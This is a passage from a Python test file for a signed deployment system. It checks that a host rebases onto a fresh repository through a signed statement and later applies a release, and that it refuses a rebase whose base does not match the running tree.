          "policy_sha256": hashlib.sha256(praw).hexdigest(), "images": images(hw.base), "configs": configs(),
          "issued_at": NOW.isoformat(), "expires_at": (NOW + timedelta(hours=1)).isoformat()}
    raw = rg.canonical(st)
    (tmp_path / "rebase.json").write_bytes(raw)
    (tmp_path / "rebase.sig").write_text(rg.sign(raw, hw.keys["founder"][0], rg.NS_REBASE))
    gateway = svc.Config({**{k: str(v) if isinstance(v, Path) else v for k, v in vars(hw.cfg).items()
                             if k not in ("checks_command",)}, "checks_command": ["true"],
                          "repository": "seerxo/seerxo-os", "clone": str(tmp_path / "host-clone-new"),
                          "fetch_url": str(origin), "policy": str(tmp_path / "policy-v2.json"),
                          "policy_sig": str(tmp_path / "policy-v2.sig")})
    return work, base, new, gateway, HOST


def test_the_host_rebases_onto_a_fresh_repository_and_then_releases_from_it(hw, tmp_path):
    work, base, new, gateway, host_id = _rebase_setup(hw, tmp_path)
    before = hw.hcfg.ledger.read_text()
    out = host.rebase_statement(new, hw.hcfg, tmp_path / "rebase.json", tmp_path / "rebase.sig", now=NOW,
                                observe=hw.prod.observe, machine_id=host_id)
    assert out == {"outcome": "REBASE_DONE", "last_sha": hw.base, "chain_base": base}
    assert hw.runs == [] and hw.prod.observe() == Production(hw.base).observe()       # nothing deployed
    copy, = hw.hcfg.ledger.parent.glob("ledger.json.pre-rebase-6-*")
    assert json.loads(copy.read_text()) == json.loads(before)

    (work / "docs").mkdir(exist_ok=True)
    (work / "docs/HANDOFF.md").write_text("from the public repository\n")
    sh(work, "git", "add", "-A")
    sh(work, "git", "commit", "-qm", "first public change")
    sh(work, "git", "push", "-q", "origin", "main")
    sha = sh(work, "git", "rev-parse", "HEAD")
    hw.cfg = gateway                                  # the gateway service now follows the new repository too
    tick = hw.tick()
    assert tick["outcome"] == "SIGNED", tick
    drafted = json.loads((gateway.outbox / f"{tick['detail']}.json").read_text())
    assert drafted["parent_sha"] == base and drafted["repository"] == "seerxo/seerxo-os"
    hw.hcfg = new
    assert step(hw) == {"outcome": "APPLIED", "sha": sha, "sequence": 7, "approver": "gateway"}
    ledger = json.loads(new.ledger.read_text())
    assert ledger["last_sha"] == sha and "chain_base" not in ledger and ledger["min_policy_version"] == 2
    assert [e["event"] for e in rg.read_history(new.ledger)][-2:] == ["rebase", "applied"]


def test_the_host_refuses_a_rebase_onto_a_base_that_is_not_the_running_tree(hw, tmp_path):
    _, _, new, _, host_id = _rebase_setup(hw, tmp_path, base_files={"docs/PERMANENT_FACTS.md": "public\n"})
    before = hw.hcfg.ledger.read_text()
    with pytest.raises(rg.Refused, match="tree is not exactly"):
        host.rebase_statement(new, hw.hcfg, tmp_path / "rebase.json", tmp_path / "rebase.sig", now=NOW,
                              observe=hw.prod.observe, machine_id=host_id)
    assert hw.hcfg.ledger.read_text() == before
